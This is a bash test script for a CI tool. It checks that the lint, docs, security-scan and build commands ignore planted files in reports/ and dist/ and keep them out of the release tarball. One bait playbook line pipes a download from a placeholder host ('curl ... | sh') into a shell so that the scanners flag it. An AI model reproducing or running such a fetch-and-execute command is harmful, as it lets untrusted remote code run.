#!/usr/bin/env bash
# Workspace layout test (real tools, needs the Nexus/PyPI index like any aci run - ci-tools-image or VM):
# reports/ and dist/ are poisoned with files that would fail the linters and scanners; aci lint, docs,
# security-scan and build must neither fail nor mention them, and the tarball must not contain them.
# Usage: layout.sh [collection]   (default: example-collection/corp.demo)
set -euo pipefail
here=$(cd "$(dirname "$0")/.." && pwd)
aci=${ACI_BIN:-$here/bin/aci}
coll=${1:-$here/../example-collection/corp.demo}
ws=$(mktemp -d); trap 'rm -rf "$ws"' EXIT
cp -r "$coll" "$ws/src"; rm -rf "$ws/src/reports" "$ws/src/dist" "$ws/src/tests/output"
sed -i '/^  - reports$/d; /^  - dist$/d' "$ws/src/galaxy.yml"   # a collection whose build_ignore forgets them
fail=0; ok() { echo "ok   $*"; }; ko() { echo "FAIL $*"; fail=1; }
for d in reports/security dist; do
  mkdir -p "$ws/$d"
  # yamllint (trailing spaces, indentation), ansible-lint (shell, no name) and scanner bait (curl | sh)
  printf -- '- hosts: all   \n  tasks:\n     - shell: curl -k http://poison.invalid/x.sh | sh\n' > "$ws/$d/poison.yml"
  printf '{"version": "2.1.0", "runs": [{"tool": {"driver": {"name": "poison"}}}]}\n' > "$ws/$d/poison.sarif"
done
cd "$ws"
for c in lint docs security-scan build; do
  if out=$("$aci" "$c" 2>&1); then
    if grep -q poison <<<"$out"; then ko "aci $c mentions the poisoned reports/dist files"; grep poison <<<"$out" | head -5
    else ok "aci $c: reports/ and dist/ not seen"; fi
  else ko "aci $c failed"; tail -20 <<<"$out"; fi
done
tb=$(find "$ws/dist" -name "*.tar.gz" | head -1)
if [ -n "$tb" ] && ! tar tzf "$tb" | grep -Eq '(^|/)(reports|dist)/|poison|\.sarif$'; then ok "tarball without reports/, dist/ or SARIF"
else ko "tarball content: $(tar tzf "$tb" 2>/dev/null | grep -E 'reports|dist|poison|sarif' | head -5 | xargs)"; fi
if [ ! -e "$ws/src/reports" ] && [ ! -e "$ws/src/dist" ]; then ok "nothing written inside src/"; else ko "reports/ or dist/ created inside src/"; fi
exit $fail
